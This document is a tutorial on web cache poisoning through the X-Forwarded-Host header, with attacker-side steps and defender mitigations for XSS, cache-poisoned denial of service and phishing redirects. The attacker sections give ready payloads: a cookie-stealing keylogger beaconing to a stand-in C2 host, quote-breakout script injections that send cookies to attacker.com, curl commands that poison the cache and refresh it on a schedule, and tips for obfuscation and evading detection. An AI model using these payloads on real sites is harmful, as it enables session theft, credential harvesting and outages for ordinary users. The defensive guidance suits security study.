# HTTP Security Headers - Offensive Theory 2
# Cache poisoning

In this section, we will focus on cache poisoning. Cache poisoning occurs when a cache, which is intended to improve performance and conserve resources, is manipulated to store malicious content. In the following examples we will describe how cache poisoning is abused from an attacker’s perspective, followed by corresponding mitigation strategies. For the test we will be using `X-Forwarded-Host` header.

> [!CAUTION]
> The following material is intended for educational and defensive security research purposes only. It describes techniques observed in real-world attacks to help developers, defenders, and security practitioners understand and mitigate cache poisoning vulnerabilities. No authorization or encouragement for illegal activity is implied.

## **Preparation for the attack - Attackers Perspective**

1.  First we must confirm whether the site blindly trusts `X-Forwarded-Host`:
    
    1.1 To do that we should first send a normal request.
    
    ```
    curl -s -D - https://target-site.com/ > normal_response.txt
    ```
    
    1.2 Now we should look inside the HTML for anything that uses the host/domain dynamically, like:
    
    1. &lt;script src="https://target-site.com/js/main.js"&gt;
    2. &lt;link rel="stylesheet" href="https://target-site.com/css/style.css"&gt;
    3. &lt;img src="https://target-site.com/images/logo.png"&gt;
    4. Any social meta tags like &lt;meta property="og:image" content="https://target-site.com/og.jpg"&gt;
    5. Note the exact domain it uses (should be the real one).


    
    1.3 Now we will send the fake request to see if there are any differences:
    
    ```
    curl -s -D - -H "X-Forwarded-Host: evil.com" https://target-site.com/ > poisoned_response.txt
    ```
    
    1.4 Finally now we should compare 2 files to know if the responses have differences. Easiest way to do that is to simply use terminal command `diff`
    
    ```
    diff normal_response.txt poisoned_response.txt | grep evil
    ```
    
    Or we can perform direct search
    
    ```
    grep "evil.com" poisoned_response.txt
    ```
    
    And finally if we see the fake domain appearing in dynamic parts of the code (scripts, src, meta, images etc) that means Vulnerability is **confirmed!**
2.  We still have 2 main confirmations to do:
    1.  **The page is cacheable:** This means that the site has cache in front like Cloudflare, nginx etc, that's allowed to store and reuse responses for multiple users. To confirm this we have to check the response headers  if we see something like:
        
        `Cache-Control: public, max-age=300` → shared cache can store it for 5 minutes. Meaning our poison will last only 5 minutes max.
        
        However if we see `Cache-Control: private` or `no-cache` or `no-store` → not cacheable by shared caches → poisoning impossible. We can check that information by running the next commands (or using alike tools):
        
        ```sh
        curl -I "https://target-site.com/?cb=test123"  # First: probably MISS
        curl -I "https://target-site.com/?cb=test123"  # Second: look for HIT or increasing Age
        ```
        
        Homepage is unlikely to have public cache control, but its still worth checking, sometimes high-traffic sites do cache homepages publicly. If it doesn't then we must spider the site by hitting individual assets the mainstream way to do so is to use devtools to find the URL for a specific asset then confirm what parts of the application can have their cache poisoned.
        
        ```
        curl -I "https://target-site.com/some/path/or/file.jpg?=cb=test123" #Same principle but aimed at specific asset
        ```
        
        The public Cache control is designed for saving resources on non critical parts of the site (A decent size won't cache data for homepage publicly) so almost always there is a part that can be poisoned.
    2.  **Cache does NOT key on** `X-Forwarded-Host`**:** As it was explained earlier Vary changes regular caching key, If `X-Forwarded-Host` is included in Vary, cache will treat requests with different values as separate keys. Your poison stays isolated to your request; normal users get the clean version. To confirm this we need to simply check the response for this command or alike:
        
        ```sh
        curl -I "https://target-site.com"
        ```
    3.  Now it's time to actually poison our cache. 

## **Preparation for the attack - Defenders Perspective**

*   **Do not trust** `**X-Forwarded-Host**` **by default**  
    Treat it as user input. Only accept it from trusted internal proxies and validate it strictly. Otherwise ignore or strip it.
*   **Use a strict host allowlist**  
    Validate `Host`, `X-Forwarded-Host`, and similar headers against a fixed list of allowed domains. Reject or normalize anything else.
*   **Never build absolute URLs from request headers**  
    Do not generate links, assets, redirects, or meta tags using `Host` or `X-Forwarded-Host`. Use a server-configured canonical domain instead.
*   **Normalize headers at the edge**  
    Strip `X-Forwarded-Host` at the CDN or reverse proxy. Re-add it only from trusted infrastructure so clients can’t inject it.
*   **Align cache keys with application logic**  
    If a header affects the response, it must be included in `Vary`. If it should not affect content, it must not be used by the application at all.
*   **Avoid public caching of dynamic HTML**  
    Use `Cache-Control: private` or `no-store` for HTML pages. Reserve `public` caching for static assets only.
*   **Prevent caching of error responses**  
    Ensure 3xx, 4xx, and 5xx responses are not cached by shared caches.
*   **Enforce canonical domains safely**  
    Redirect to the canonical host using server configuration, not unvalidated request headers.
*   **Monitor and test**  
    Watch for cache anomalies and regularly test host header and cache behavior the same way an attacker would.

**There are multiple ways of taking advantage of this situation. We will cover the mainstream ways to do so.**
    
## **Option 1: XSS cache poisoning attack - Attackers Perspective**

If we oversimplify, XSS attack occurs when the threat actor runs a malicious JavaScript code in users browser under the site's context. Those scripts can steal data, redirect user to a malicious site, etc. Now lets see how it can be executed in our context.

1.  **Control our own domain/subdomain:**
    
    To do so we need to buy/register a domain “attacker.com” or use a free subdomain from vendors who are ready to provide us with subdomain, then we will point that domain to our server/vps with our code ready and intact. The reason for this is painfully simple, we just have to look at this snippet of code.
    
    ```
    <img src="https://attacker.com/assets/js/evil.js">
    ```
    
    This was supposed to be a simple image the `src` is there to point to it, however since cache is poisoned it will point out to our server instead.
2.  **Craft malicious JS payload:**
    
    For this example we will try a simple Keylogger that steals cookies/forms and beacons to our C2 (Command and Control). This code should be located on the exact path we pointed our poison to.
    
    ```
    // Steal cookies and send to attacker  
    fetch('https://your-c2.com/log?data=' + encodeURIComponent(document.cookie));  
    // Or full keylogger  
    document.addEventListener('keydown', e => {  
      fetch('https://your-c2.com/key?k=' + e.key);  
    });  
    // Bonus: Steal localStorage, hijack forms, mine crypto silently  
    alert('Pwned by cache poison!'); // For testing visibility  
    ```
    
    Nothing stops us from making this script stealthier, and more profitable.
    
    Our infrastructure is ready time to execute the attack.
3.  **Execute the plan and poison the cache:**
    
    As shown before now we should send our poisonous request, example will showcase curl usage but other tools will work too.
    
    ```
    curl -s -D - -H "X-Forwarded-Host: attacker.com" "https://vuln-site.com/?cb=pwn1337" > poisoned.html  
    ```
    
    Check poisoned.html: Grep for "attacker.com" in scripts/links. If it's there → backend reflected it.
    
    Hit again without header:
    
    ```
    curl -s -D - "https://vuln-site.com/?cb=pwn1337" | grep attacker.com  
    ```
    
    If it shows up + X-Cache: HIT → poisoned for all.
4.  **Verify XSS fires on victims:**
    1.  Open the poisoned URL in a browser (incognito, no extensions).
    2.  Devtools > Network: See it loading `https://attacker.com/evil.js`.
    3.  Console: If your JS has console.log or alert, it pops. Network tab shows beacons to your C2 with stolen data.
    4.  Multi-user test: Spin up VMs/proxies — each "victim" gets the same poisoned cache hit, XSS executes client-side.
5.  **Bypass CSP:**
    
    Content Security Policy (CSP) often blocks external scripts via script-src ‘self’. This makes the XSS cache poisoning practically impossible, unless the Developers commit one crucial mistake. Sometimes dynamic links are being served like this:
    
    ```html
    <link rel="preconnect" href="https://[X-Forwarded-Host]/...">
    <img src="https://[X-Forwarded-Host]/logo.png" alt="...">
    <script src="https://[X-Forwarded-Host]/static/js/main.js"></script>
    <a href="https://[X-Forwarded-Host]/login">Login</a>
    <div title="[X-Forwarded-Host] is the best">
    ```
    
    To fight this we will have to inject the **inline** script directly into the cached HTML. Because the `[X-Forwarded-Host]`  is in the middle of quotes ("") we can close them early ourselves and then inject our actual payload, like in this classic quote breakout  
    `X-Forwarded-Host: example.com"><script>alert(document.domain)</script>` . Now lets compare the new codes on the site.
    
    For example:
    
    ```html
    <script src="https://example.com/main.js"></script>
    ```
    
    Will now turn into
    
    ```html
    <script src="https://example.com"><script>alert(document.domain)</script>/main.js"></script>
    ```
    
    The browser parses it as two separate script tags. The inline runs instantly, CSP often allows 'unsafe-inline' or doesn't block it at all on old sites.</p><script> runs instantly, CSP often allows 'unsafe-inline' or doesn't block it at all on old sites. But more importantly because we poison the cache CSP sees our script as **trusted** as its being served directly from the html body from trusted origin, aka our `target.com`.
    
    There is still some interesting payloads we should pay attention to!
    
    1.  If they HTML-encode the quotes (rare), we should try double-quote version:
        
        ```
        X-Forwarded-Host: example.com%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
        ```
    2.  Silent payload to avoid alerts:
        
        ```
        X-Forwarded-Host: x.com%22%3e%3cscript%3esetTimeout(()%3d%3e{fetch('https://attacker.com/steal?c='%2bdocument.cookie)},1000)%3c/script%3e
        ```
    3.  When it's in title= or alt= (no src/href):
        
        ```html
        X-Forwarded-Host: "><script src=//attacker.com/evil.js></script>
        ```
    4.  If nothing works we can try JSON injection (if host used in JSON response):
        
        ```html
        X-Forwarded-Host: {"evil":true}//example.com
        ```
        
        This will break JSON structure, Angular/React _sometimes_ treats it as JS expression which allows arbitrary code execution.

> [!WARNING]
> In practice unless the JSON is eval’d unsafely (which is itself another vulnerability). This method won't work, so i wouldnt recommend counting on it much.

Finally all left is to check if the Bypass is possible. To confirm that we have to run these commands or alike:

```sh
	# Test 1 - basic breakout
	curl -H "X-Forwarded-Host: x.com\"><script>alert(1)</script>" "https://vuln.com/?cb=1337"

	# Test 2 - encoded version
	curl -H "X-Forwarded-Host: x.com%22%3e%3cscript%3ealert(1)%3c/script%3e" "https://vuln.com/?cb=1337"

	# Test 3 - with a dummy param to avoid trailing garbage
	curl -H "X-Forwarded-Host: x.com/anything\"><script>alert(1)</script>" "https://vuln.com/?cb=1337"
```

If any of these work, then the CSP bypass is possible and it's time to inject our actual code.

1.  There are still mistakes we must avoid.
    1.  **Forced Prefix or Suffix Handling:**
        
        In some implementations, developers prepend or append fixed strings to user-controlled host values, such as adding `https://` or a trailing `/`.
        
        For example:
        
        ```sh
        <script src="https://https://example.com/js/main.js"></script>
        ```
        
        This results in a duplicated protocol or unwanted suffix, producing an invalid URL.
        
        If an attacker injects:
        
        `x.com"><script>alert(1)</script>`
        
        It may be reflected as:
        
        `<script src="https://https://x.com"><script>alert(1)</script>/js/main.js"></script>`
        
        In this case, the browser fails to execute the injected script due to the malformed URL or extraneous path content.
        
        **Common bypass techniques include:**
        
        1.  Starting the payload with `//` to neutralize the enforced protocol
        2.  Absorbing the appended suffix using a dummy path segment
    2.  **Trailing Path Appended by the Application:**
        
        Some applications construct script URLs dynamically, for example:
        
        `"https://" + host + “/static/js/main.js”`  And an injected value such as: `example.com"><script>alert(1)</script>`
        
        Will become:
        
        ```sh
        <script src="https://example.com"><script>alert(1)</script>/static/js/main.js"></script>
        ```
        
        Here, the trailing path breaks the injected tag, causing the browser to ignore it.
        
        **Mitigations include:**
        
        1.  Adding a fake path segment that absorbs the suffix
        2.  Using comment or tag-balancing techniques to preserve valid HTML
    3.  **Input Sanitization or Truncation:**
        
        Some applications may sanitize the input by:
        
        1.  Escaping or removing quotes
        2.  Replacing `<` and `>` with HTML entities
        3.  Truncating overly long values
        4.  These defenses often prevent direct tag injection.
        
        **Bypass strategies:**
        
        1.  Testing URL-encoded characters (e.g., `%22`, `%3C`)
        2.  Using shorter or alternative payload structures
    4.  **Host Validation or Normalization:**
        
        Some systems restrict allowed domains, normalize input, or strip special characters. As a result, malicious input may be rejected outright or transformed into a non-executable string.
    5.  **Non-Injectable Reflection Context:**
        
        If the reflected value appears inside a text node, JSON structure, or an attribute without quotes, breaking out into executable HTML may not be possible.
2.  We still have work to do, it's time to look at the capabilities of our poisoned cache, or even make it more dangerous, it still needs our attention to maximize our profit.
    1.  **Mass Scale:**
        
        This is simple, the more popular is the poisoned page, more victims will be lured into the trap. `Cache-Control` can also provide us with information on how big is the scale of our attack. For example:
        
        `max-age=86400` (86,400 seconds = 24 hours) means your poison potentially can live for a full day unless cache was evicted earlier, like under pressure, (or longer if s-maxage/stale-while-revalidate). No need to re-poison constantly.
    2.  **Chain with SSRF/redirects:**
        
        If the reflection lets us control full URLs (not just host), abuse it deeper:
        
        Point resources to internal IPs `(127.0.0.1, 169.254.169.254 for cloud metadata)`. Victims' browsers fetch those → exfil internal data (AWS keys, DB creds) to your server via error logs or whatever. Classic SSRF via client-side.
        
        Or force open redirects: Reflect into <meta refresh> or location.href → poisoned page bounces all visitors to your phishing site (bank login clone). Mass credential harvest.
    3.  **Persistence:**
        
        Cache will eventually die but we can't allow that to happen.
        
        Script/cronjob that re-sends the poison request every few minutes/hours → refreshes the cache indefinitely.
        
        Advanced technique: Poison ETags or Last-Modified headers too → victim's **browser cache** holds the poison forever (even after CDN clears). Eternal XSS until user clears cache manually.
    4.  **Detection evasion:**
        
        We must avoid being caught quick, luckily we can extend our poison's lifespan. Ways to do that include.
        
        1.  Register domains like secure-vuln site.com or vuln-site-resources.net — looks legit, delays suspicion.
        2.  Obfuscate your JS: Minify, encrypt strings, use eval(fromCharCode), no obvious alerts. Make it silent — only exfil data, no popups/deface.

## **XSS cache poisoning attack - Defenders Perspective**

*   **Never reflect request headers into HTML**  
    Not in `src`, `href`, `title`, meta tags, JSON, anywhere. Headers are transport metadata, not template variables. If a header reaches HTML, someone screwed up.
*   **Use a fixed, server-side canonical origin**  
    All absolute URLs must come from configuration, not runtime input. If the app ever does `https://` + something from the request, that’s a red flag waving a flamethrower.
*   **Context-aware output encoding, always**  
    HTML-encode for text nodes, attribute-encode for attributes, JS-encode for JS, JSON-encode for JSON. One-size-fits-all escaping is how quote breakouts happen.
*   **Eliminate** `**unsafe-inline**` **in CSP**  
    Inline scripts turn quote injection into instant code execution. Use nonces or hashes only. Old sites with `unsafe-inline` are basically asking to be haunted.
*   **Disallow dynamic script origins entirely**  
    `script-src` should be `'self'` plus exact allowlisted domains. No wildcards, no runtime-generated hosts, no “but it’s flexible”.
*   **Reject malformed host values early**  
    If a value contains quotes, angle brackets, spaces, or encoded equivalents, drop the request. Hosts are domains, not creative writing exercises.
*   **Lock down HTML templating logic**  
    Templates should not concatenate strings to build tags. Use framework helpers that auto-escape and enforce context safety.
*   **Separate data and markup strictly**  
    JSON responses must never be `eval` ’d or treated as executable code. If frontend logic executes server responses, the problem predates cache poisoning.
*   **Set defensive browser headers**
    *   `X-Content-Type-Options: nosniff`
    *   `Referrer-Policy: strict-origin-when-cross-origin`
    *   `Cross-Origin-Opener-Policy` and `Cross-Origin-Embedder-Policy`  
        These won’t fix the bug, but they reduce blast radius.
*   **Monitor for external asset loads**  
    Alert when pages suddenly load scripts, images, or fonts from new domains. That’s usually not a feature launch.
*   **Actively test your own site like an attacker**  
    Inject quotes, encoded payloads, broken hosts, weird headers. If the HTML breaks, attackers already found it.

## **Option 2: Cache poisoned DoS (CPDoS) attack - Attackers Perspective**

A Cache-Poisoned Denial-of-Service **(CPDoS)** is achieved when an attacker caches a malicious or malformed response that causes the legitimate page content to become inaccessible. Once stored in the cache, the poisoned response is served to all users attempting to access the affected resource – effectively resulting in a denial of service.

1.  **Find a Poison Value That Triggers Backend Errors:**
    
    Not every redirect will work for CPDoS attack, First thing we must do to achieve success we must find a fake host that will make the origin _freak_ out. Common triggers for that would be:
    
    1.  **Invalid or disallowed host**: If the backend has a whitelist of allowed hosts (e.g., via server config or WAF), set X-Forwarded-Host to something outside it. Result: 403 Forbidden or 400 Bad Request.
    2.  **Oversized host**: We can use a **very** long string as fake host (e.g., "a" repeated 10k times) if the backend has header size limits tighter than the cache's. Cache accepts, origin rejects with 413 Payload Too Large.
    3.  **Meta characters or malformed host**: Inject malformed host names. Like weird control chars (\\r\\n) or invalid ‘域名’ if the backend parses strictly. Could trigger 400 or internal errors.
    4.  **Host pointing to non-existent resources**: If the backend uses the host to fetch internal stuff (e.g., redirects or proxying), a bogus one might cause 502 Bad Gateway or timeouts.
    
    Now we need to perform testing:
    
    ```
    curl -s -D - -H "X-Forwarded-Host: superlongevilhostthatexceedslimits.example.com" https://target-site.com/ > error_response.txt
    ```
    
    that  **grep** the response for errors
    
    ```
    grep -E "400|403|413|500|502|503" error_response.txt
    ```
    
    Or we can look at the `body` to look for generic error pages like “Bad request” or “Access Denied” etc. If we find any error that wouldn't have been there if we haven't made our request, that means we get out first green flag for potential CPDoS attack.
2.  **Confirm the Error Gets Cached:**
    
    We confirmed that the error occurs but we didn't confirm whether its cached yet. We don't _assume_  we check. To do so we will have to send a normal request now.
    
    ```
    curl -s -D - https://target-site.com/ > post_poison.txt
    ```
    
    1.  **Compare:** If post\_poison.txt now has the error too, then poison will work for everyone.
    2.  **Bonus:** Use a cache-buster param if needed (e.g., ?cb=ignoreme) but only if the cache keys ignore it. Watch the Age header increase on repeats to confirm hits.
    
    However chance of failure here is high since most setups DON'T cache non-200 responses. To fight against this we will have to spider the web to find an endpoint that WILL cache our poison.
3.  **Execute the DoS Poison:**
    
    Finally after confirming that Poisoning is possible it's time to unleash our attack.
    
    1.  Send poisoned request to the target endpoint. Example for Oversized Host attack:
        
        ```
        curl -s -D - -H "X-Forwarded-Host: $(printf 'a%.0s' {1..10000}).evil.com" https://target-site.com/some/cacheable/path > /dev/null
        ```
    2.  Repeat if max-age is short—automate with a loop or script to re-poison every few minutes.
    3.  For maximum impact target high-traffic pages
    
    Now Legit users will be receiving errors, their browsers will fail to load scripts/CSS/images etc, or even the full page. This can severely damage the organization under the attack.
4.  **Edge Cases - Increase Severity of the attack:**
    1.  **Vary bypass**: If Vary includes other headers, spoof 'em to match normal requests.
    2.  **Multi-layer caches**: Poison CDNs first, then origins if possible.
    3.  **Defenses to watch**: WAFs might block weird headers; test stealthy. If hosts are normalized poison will be **useless**.

## **Cache poisoned DoS (CPDoS) attack - Defenders Perspective**

*   **Do not trust client-controlled headers**  
    Ignore or strictly validate `X-Forwarded-Host`, `X-Forwarded-Proto`, `Host`, etc. Only accept values from trusted reverse proxies.
*   **Normalize cache keys**  
    Ensure caches vary only on intended headers. Do **not** let arbitrary headers influence cache keys unless absolutely required.
*   **Set proper** `**Vary**` **headers**  
    Explicitly define which headers affect responses. Missing or overly broad `Vary` headers are cache poisoning bait.
*   **Separate dynamic and static content**  
    Do not cache responses that include redirects, user input, or dynamically generated URLs.
*   **Harden redirect logic**  
    Never build redirect targets directly from headers or user input. Use allowlists for domains and schemes.
*   **Use strict proxy configuration**  
    Reverse proxies should overwrite forwarding headers instead of passing client-supplied ones upstream.
*   **Disable caching on sensitive responses**  
    Apply `Cache-Control: no-store` or `private` for redirects, auth flows, and error pages.
*   **Monitor cache behavior**  
    Log cache hits involving redirects or unusual headers. Poisoning often leaves fingerprints before damage.

## **Option 3: Open redirect / phishing boost by cache poisoning - Attackers Perspective**

If you are familiar with phishing (what it is and how it usually occurs), then understanding this attack is not difficult. In this case, a poisoned cache causes the victim’s browser to redirect to a resource controlled by the attacker. This can result in users willingly submitting credentials through social engineering, or unintentionally leaking session tokens or cookies.

For example:

1.  A user clicks an image on `instagram.com`.
2.  Instead of being redirected to a legitimate resource owned by Instagram, the user is redirected due to a previously poisoned cache to `instagrarn.com` (intentional typosquatting).
3.  Because the redirect originates from a trusted domain, the user believes the flow is legitimate and enters login credentials, which are sent directly to the attacker.
4.  Alternatively, sensitive data can be leaked through the `Referer` header. For example, the attacker may observe  
    `Referer: https://instagram.com/account?session=ABC123`,  
    allowing them to hijack the user’s session while it remains valid.

To perform this kind of attack, the following steps must be satisfied.

1.  **Prepare your Endpoint:**
    
    We wont go deep on this step as its practically the same as in **XSS cache poisoning** section. In order to succeed for this step, you (in this fake scenario the attacker) have to understand your position:
    
    1.  **What do you have in hands:**
        
        How good are your skills and are they enough for your plans? Do you own or rent proper infrastructure (domain/subdomain, vps, etc)?
    2.  **What will bypass security of the target:**
        
        What is theoretically possible? What can you do to your target if you consider the layers of security it has?
    3.  **What is your end-goal:**
        
        Depending on your end-goal your actions to achieve it will be different
2.  **Identify a vulnerable open redirect endpoint:**
    
    We will have to spider the site to find URLs that perform redirects based on parameters (e.g., /redirect?url=..., /go?to=..., /link?dest=...) or reflect unkeyed headers like X-Forwarded-Host in Location headers/meta refreshes. Prioritize static-like assets (images, trackers, ad links) as they're often publicly cached.
    
    ```sh
    curl -I -H "X-Forwarded-Host: evil.com" "https://target.com/redirect?cb=test"
    ```
3.  After verifying that the cache poison is successful (subsequent clean requests receive a cache HIT and are redirected to the controlled test domain), ensure persistence by automating re-poisoning requests if the max-age is limited—for example, via a scheduled script executing
    
    ```
    curl -s -H "X-Forwarded-Host: evil.com" "https://target.com/redirect?url=/demo&cb=poison123" > /dev/null
    ```

> [!IMPORTANT]
> **Cache buster handling**: If the endpoint ignores cache-buster params (?cb=xyz) in the key, your poison spreads to all variations of that path. Huge amplification.
> 
> **Browser caching bonus**: If response lacks no-cache headers, victims' local browsers cache the poison too—persists even after CDN evicts.

## **Option 3: Open redirect / phishing boost by cache poisoning - Defenders Perspective**

*   **Threat model**  
    Treat all client‑supplied headers as untrusted by default.
*   **Trust boundaries**  
    `X‑Forwarded‑*` headers must only be set and overwritten by trusted proxies, never accepted from users.
*   **Cache abuse awareness**  
    Attacks target shared caches, turning your infrastructure into the delivery mechanism.
*   **Cache key control**  
    Any header that affects the response must be part of the cache key or ignored completely.
*   **Redirect hardening**  
    Avoid caching redirects or strictly validate destination hosts.
*   **Cache control**  
    Use `Cache-Control: no-store` for authentication, redirects, and user‑specific content.
*   **Proxy configuration**  
    Proxies should sanitize, not forward, client-controlled headers.
*   **Monitoring**  
    Alert on cached responses pointing to unexpected or external domains.
*   **Defensive mindset**  
    Cache poisoning is silent and scalable. Assume it will be attempted, not avoided.

> [!TIP]
> **Chain with other vulnerabilities:**
> 
> 1.  If there's also param reflection (like ?next=), combine for open redirect + cache poison.
> 2.  Or poison error pages (force 404 with bad path, reflect host there).
